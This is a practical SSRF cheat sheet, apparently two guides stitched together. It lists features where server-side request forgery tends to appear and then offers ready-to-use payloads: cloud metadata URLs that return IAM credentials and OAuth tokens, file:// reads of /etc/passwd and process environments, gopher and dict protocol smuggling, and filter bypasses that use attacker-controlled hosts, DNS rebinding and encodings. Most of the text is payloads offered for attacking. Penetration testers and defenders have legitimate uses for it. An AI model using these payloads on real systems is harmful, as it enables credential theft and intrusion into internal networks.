


# ðŸ”¥ SSRF Test Cases & Payloads (Complete Practical Guide)

SSRF happens whenever the server makes a request to a **user-controlled URL**.

---

# âœ… Where SSRF is Commonly Found

### **1. File Upload With URL Import**
Common cases:
- â€œUpload image from URLâ€
- â€œImport file from external linkâ€
- â€œFetch profile picture from linkâ€

### **2. Webhooks / Callbacks**
Examples:
- Payment webhook URL  
- API callback URL  
- Integration URLs (Slack, Discord, Jira)

### **3. URL Preview / Metadata Fetch**
Examples:
- Chat apps fetching preview of a link  
- Social media preview (title, image)

### **4. PDF / Image Generation Services**
These fetch remote resources:
- HTML-to-PDF converters  
- Markdown renderers  
- Image merging tools  

### **5. Server-Side REST API Calls**
If user controls an internal parameter:
GET /api?url=http://127.0.0.1/admin


### **6. OAuth Redirect URL Misconfigurations**
If `redirect_uri` is fetched server-side:


redirect_uri=http://127.0.0.1:8000


### **7. SSRF via XML (XXE)**
DTD fetching remote URLs.

### **8. Regular File Fetch Features**
- â€œDownload from URLâ€
- â€œSync from remote serverâ€
- â€œFetch RSS feedâ€
- â€œLoad JSON from external linkâ€

### **9. Cloud Metadata-Related Features**
Targets like:


http://169.254.169.254/latest/meta-data/


---

# ðŸ”¥ Summary

| Feature Type | SSRF Risk |
|--------------|-----------|
| Upload (URL import) | âœ” Common |
| Webhooks | âœ” Very common |
| URL preview | âœ” |
| PDF/image render | âœ” |
| API fetchers | âœ” |
| OAuth redirects | âœ” |
| XXE | âœ” |
| RSS / JSON import | âœ” |

> **SSRF can be anywhere the server fetches a URL or network resource.**

---

# ðŸ”¥ SSRF Test Cases & Payloads

Below is everything to test on any parameter that accepts **URL / File / Callback / Webhook / Import / Metadata features.**

---

# âœ… 1. Basic Internal Network Check

### **Payloads**
      
      
      http://127.0.0.1
      
      http://localhost
      
      http://0.0.0.0
      
      http://[::1]


### **Common Ports**

      
      http://127.0.0.1:80
      
      http://127.0.0.1:443
      
      http://127.0.0.1:22
      
      http://127.0.0.1:3306
      
      http://127.0.0.1:8080
      
      http://127.0.0.1:5000


---

# âœ… 2. Cloud Metadata Services

### **AWS**


      http://169.254.169.254/latest/meta-data
      
      http://169.254.169.254/latest/meta-data/iam/security-credentials/
      

### **GCP**


http://169.254.169.254/computeMetadata/v1/


### **Azure**


      http://169.254.169.254/metadata/instance?api-version=2021-02-01


### **DigitalOcean**


      http://169.254.169.254/metadata/v1/


---

# âœ… 3. Protocol-Based SSRF

### **file://**


      file:///etc/passwd
      file://C:/windows/win.ini


### **dict://**


dict://127.0.0.1:6379/info


### **gopher://** (Very powerful)


      gopher://127.0.0.1:11211/
      gopher://127.0.0.1:3306/


---

# âœ… 4. Redirect Bypass

### **Payload**


      http://yourdomain.com/redirect-to-127.0.0.1


### **Redirect code example**


HTTP/1.1 302 Found
Location: http://127.0.0.1:80


---

# âœ… 5. DNS Rebinding Bypass

Services: `xip.io`, `sslip.io`, `nip.io`

### **Payloads**


http://127.0.0.1.sslip.io

http://10.0.0.1.nip.io


---

# âœ… 6. Bypass Using @



      http://evil.com@127.0.0.1/


---

# âœ… 7. URL Encoding Bypasses


      
      http://127.0.0.1%2f
      
      http://127.1
      
      http://0


---

# âœ… 8. Blind SSRF Detection

### **Payload**


      http://<your-collaborator-domain>


If the server makes DNS/HTTP request â†’ **Blind SSRF confirmed**.

---

# âœ… 9. SSRF via POST JSON



      {
      "avatar_url": "http://127.0.0.1
      "
      }


Test fields containing:
- `url`
- `callback`
- `avatar`
- `import`
- `fetch`

---

# âœ… 10. SSRF via Upload (Very Common)



      http://127.0.0.1/admin
      
      http://localhost/server-status


---

# ðŸ”¥ BONUS â€” High-Value Internal URLs



      http://127.0.0.1/server-status?full
      
      http://127.0.0.1/phpinfo.php
      
      http://127.0.0.1:9200/_cat
      
      http://127.0.0.1:8080/_profiler
      
      http://127.0.0.1:3000/api/



-------------------------------------------



# Server-Side Request Forgery (SSRF) Payloads

## Localhost Variants (Bypass Filters)

| Type | Payloads |
| :--- | :--- |
| **Standard** | `http://127.0.0.1:80`<br>`http://localhost:80`<br>`https://127.0.0.1:443`<br>`https://localhost:443` |
| **IPv6** | `http://[::]:80`<br>`http://0000::1:80`<br>`http://[0:0:0:0:0:ffff:127.0.0.1]` |
| **Shortened** | `http://127.1`<br>`http://127.0.1`<br>`http://0/` |
| **Decimal** (127.0.0.1) | `http://2130706433`<br>`http://017700000001` (octal) |

## File Protocol (Local File Disclosure)

- `file:///etc/passwd`
- `file:///c:/windows/win.ini`
- `file://path/to/config`
- `file:///etc/passwd` (`# Double slash bypass`)
- `file:///proc/self/environ` (`# Environment variables`)
- `file:///proc/version` (`# Kernel info`)

## Alternative Protocols (Protocol Bypass)

| Protocol | Example |
| :--- | :--- |
| **SFTP** | `sftp://attacker.com:22/` |
| **TFTP** | `tftp://192.168.1.1:69/` |
| **LDAP** | `ldap://localhost:389/` |
| **GOPHER** | `gopher://127.0.0.1:80/_GET%20/ HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a` |
| **DICT** | `dict://127.0.0.1:11211/` |

---

## AWS Metadata Service (IMDSv1)

- `http://169.254.169.254/latest/meta-data/`
- `http://169.254.169.254/latest/meta-data/ami-id`
- `http://169.254.169.254/latest/meta-data/hostname`
- `http://169.254.169.254/latest/meta-data/public-keys/`
- `http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy`

---

## Google Cloud Metadata

- `http://169.254.169.254/computeMetadata/v1/`
- `http://metadata.google.internal/computeMetadata/v1/`
- `http://metadata/computeMetadata/v1/`
- `http://metadata.google.internal/computeMetadata/v1/instance/id`
- `http://metadata.google.internal/computeMetadata/v1/instance/hostname`
- `http://metadata.google.internal/computeMetadata/v1/project/project-id`
- `http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id`

**Requires** `Metadata-Flavor: Google` **header**

## Azure Instance Metadata Service (IMDS)

- `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- `http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01`
- `http://169.254.169.254/metadata/instance/network?api-version=2021-02-01`
- `http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text`
- `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`

**Requires** `Metadata: true` **header**

---

## Usage in ssrf.php Context

- **Test these in your ssrf.php:**

      http://192.168.1.45/ssrf.php?img_url=http://127.0.0.1:22

      http://192.168.1.45/ssrf.php?img_url=file:///etc/passwd

      http://192.168.1.45/ssrf.php?img_url=http://169.254.169.254/latest/meta-data/

      http://192.168.1.45/ssrf.php?img_url=gopher://127.0.0.1:6379/_INFO

## Filter Bypass Techniques

- **URL encoding**

  `%68%74%74%70://127.0.0.1`

- **@ bypass**

  `http://expected.com@127.0.0.1`

- **Fragment bypass**

  `http://127.0.0.1#expected.com`

- **Case variations**

  `HtTp://127.0.0.1`

  `hTTp://localhost`
